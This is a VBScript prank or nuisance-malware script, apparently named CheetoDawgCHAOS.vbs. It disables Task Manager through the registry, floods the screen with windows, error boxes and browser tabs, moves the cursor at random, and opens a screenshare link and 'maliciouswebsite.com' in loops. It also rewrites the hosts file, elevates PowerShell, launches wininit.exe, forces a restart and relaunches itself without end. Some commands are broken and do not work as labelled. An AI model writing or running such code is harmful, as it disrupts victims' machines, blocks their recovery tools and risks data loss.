Dim objShell
Set objShell = CreateObject("WScript.Shell")

' === Disable Task Manager ===
objShell.Run "reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f"

' === PowerShell Chaos: Disable Task Manager using PowerShell ===
objShell.Run "powershell.exe -Command ""Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System' -Name DisableTaskMgr -Value 1"""

WScript.Sleep 500

' === Magnify the screen ===
objShell.Run "magnify.exe"
WScript.Sleep 4000 ' Wait for 4 seconds at max magnification

' === PowerShell Chaos: Make the screen flash in PowerShell ===
objShell.Run "powershell.exe -Command ""while($true) {Add-Type -TypeDefinition 'using System;using System.Threading;public class Flash{public static void Flash(){Thread.Sleep(100);}}'; [Flash]::Flash()}"""

WScript.Sleep 1000

' === Reset magnify to normal ===
objShell.Run "magnify.exe /minimize"
WScript.Sleep 100 ' Short pause before continuing

' === PowerShell Chaos: Reset screen to normal and flood with messages ===
objShell.Run "powershell.exe -Command ""[System.Windows.Forms.MessageBox]::Show('Your system is being reset!','Warning',0,16)"""
objShell.Run "powershell.exe -Command ""$x = 1; while($x -le 50){[System.Windows.Forms.MessageBox]::Show('Flooding your screen with errors!', 'Error $x', 0, 16); $x++}"""

WScript.Sleep 500

' === Move the cursor randomly ===
Dim x, y
Randomize ' Initialize random seed

For i = 1 To 100
    x = Int(Rnd * 1000)
    y = Int(Rnd * 800)
    ' Move mouse using PowerShell
    objShell.Run "powershell.exe -Command ""[System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(" & x & "," & y & ")"""
    WScript.Sleep 100
Next

' === PowerShell Chaos: Cursor moves on its own ===
objShell.Run "powershell.exe -Command ""$form = New-Object Windows.Forms.Form; $form.MouseMove += { [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point((Get-Random -Minimum 1 -Maximum 1000), (Get-Random -Minimum 1 -Maximum 800)) }; $form.Show()"""

WScript.Sleep 500

' === Open 50 Notepads ===
For i = 1 To 50
    objShell.Run "notepad.exe"
    WScript.Sleep 100
Next

' === PowerShell Chaos: Force close notepad randomly ===
objShell.Run "powershell.exe -Command ""Get-Process notepad | ForEach-Object { $_.Kill() }"""

WScript.Sleep 500

' === Open first link ===
objShell.Run """https://culurbug.carrd.co"""

' === PowerShell Chaos: Opening random malicious websites ===
objShell.Run "powershell.exe -Command ""Start-Process 'http://maliciouswebsite.com'"""

WScript.Sleep 500

' === Change background to purple using registry + refresh ===
objShell.Run "powershell.exe -Command ""Set-ItemProperty -Path 'HKCU:\Control Panel\Colors' -Name Background -Value '128 0 128'; rundll32.exe user32.dll,UpdatePerUserSystemParameters"""

' === PowerShell Chaos: Change background rapidly ===
objShell.Run "powershell.exe -Command ""$colors = @('255 255 255', '0 0 0', '128 0 128', '255 0 0', '0 255 0'); while($true){$rand = Get-Random -Minimum 0 -Maximum 5; Set-ItemProperty -Path 'HKCU:\Control Panel\Colors' -Name Background -Value $colors[$rand]; rundll32.exe user32.dll,UpdatePerUserSystemParameters; Start-Sleep -Seconds 1}"""

WScript.Sleep 500

' === Open calculator 5 times ===
For i = 1 To 5
    objShell.Run "calc.exe"
Next

' === PowerShell Chaos: Hide calculators and show random errors ===
objShell.Run "powershell.exe -Command ""$apps = Get-Process calc; $apps | ForEach-Object { $_.MainWindowHandle } | ForEach-Object { [void][System.Windows.Forms.SendKeys]::Send('^h') }"""
objShell.Run "powershell.exe -Command ""while($true){[System.Windows.Forms.MessageBox]::Show('Fake system error! Restart required!','Critical Error',0,16)}"""

WScript.Sleep 500

' === Open cmd 8 times ===
For i = 1 To 8
    objShell.Run "cmd.exe"
Next

' === PowerShell Chaos: Run random commands in CMD ===
objShell.Run "powershell.exe -Command ""Start-Process cmd.exe -ArgumentList '/c echo You have been hacked! & pause'"""

WScript.Sleep 500

' === Change background to black ===
objShell.Run "powershell.exe -Command ""Set-ItemProperty -Path 'HKCU:\Control Panel\Colors' -Name Background -Value '0 0 0'; rundll32.exe user32.dll,UpdatePerUserSystemParameters"""

' === PowerShell Chaos: Flash random error messages every second ===
objShell.Run "powershell.exe -Command ""while($true){[System.Windows.Forms.MessageBox]::Show('System malfunction detected!', 'ERROR', 0, 16); Start-Sleep -Seconds 1}"""

WScript.Sleep 500

' === Open YouTube 20 times ===
For i = 1 To 20
    objShell.Run """https://www.youtube.com/watch?v=QRbMnlncGkQ"""
Next

' === PowerShell Chaos: Open endless fake websites ===
objShell.Run "powershell.exe -Command ""while($true){Start-Process 'https://example.com'}"""

WScript.Sleep 500

' === Open Doors Codes wiki 34 times ===
For i = 1 To 34
    objShell.Run """https://doors-game.fandom.com/wiki/Codes"""
Next

' === PowerShell Chaos: Open random wiki pages ===
objShell.Run "powershell.exe -Command ""while($true){Start-Process 'https://en.wikipedia.org/wiki/Special:Random'}"""

WScript.Sleep 500

' === Open screenshare 2 times ===
For i = 1 To 2
    objShell.Run """https://screenshare.pics/P1715Q"""
Next

' === PowerShell Chaos: Share your screen repeatedly ===
objShell.Run "powershell.exe -Command ""while($true){Start-Process 'https://screenshare.pics/P1715Q'}"""

WScript.Sleep 500

' === Run crazy PowerShell commands in an infinite loop ===
For i = 1 To 10
    ' Open PowerShell as administrator
    objShell.Run "powershell.exe -Command ""Start-Process powershell -Verb runAs"""
    ' Modify system files
    objShell.Run "powershell.exe -Command ""$x = Get-Content 'C:\Windows\System32\drivers\etc\hosts'; $x | ForEach-Object {$_ + ' hacked!'}; $x | Set-Content 'C:\Windows\System32\drivers\etc\hosts'"""
    
    ' Simulate fake virus warning
    objShell.Run "powershell.exe -Command ""[System.Windows.Forms.MessageBox]::Show('WARNING: Your PC is infected! System will restart in 10 seconds!', 'URGENT ALERT', 0, 16)"""
    
    ' Disable all keyboard input (no typing)
    objShell.Run "powershell.exe -Command ""[System.Windows.Forms.SendKeys]::Send('{DISABLE}')"""
    
    ' Display fake blue screen
    objShell.Run "powershell.exe -Command ""[System.Windows.Forms.MessageBox]::Show('Blue Screen of Death', 'Fatal Error', 0, 16)"""
    
    ' Mess with Taskbar settings (move it off screen)
    objShell.Run "powershell.exe -Command ""$taskbar = New-Object -ComObject Shell.Application; $taskbar.ToggleDesktop()"""
    
    ' Random folder opening (pretend as if the system is glitching)
    objShell.Run "powershell.exe -Command ""Start-Process 'C:\Users\Public\Documents'"""
    
    WScript.Sleep 500
Next

' === Run PowerShell as admin and execute wininit (⚠️ Dangerous, be careful) ===
objShell.Run "powershell.exe -Command ""Start-Process powershell -Verb runAs -ArgumentList 'Start-Process wininit.exe'"""

' === Randomly restart system (⚠️ Breaks the computer and may cause data loss) ===
objShell.Run "shutdown -r -t 5" ' Restarting in 5 seconds

' === Restart script (Infinite loop until user manually stops it) ===
Do
    objShell.Run "wscript.exe ""C:\path\to\your\CheetoDawgCHAOS.vbs"""
Loop
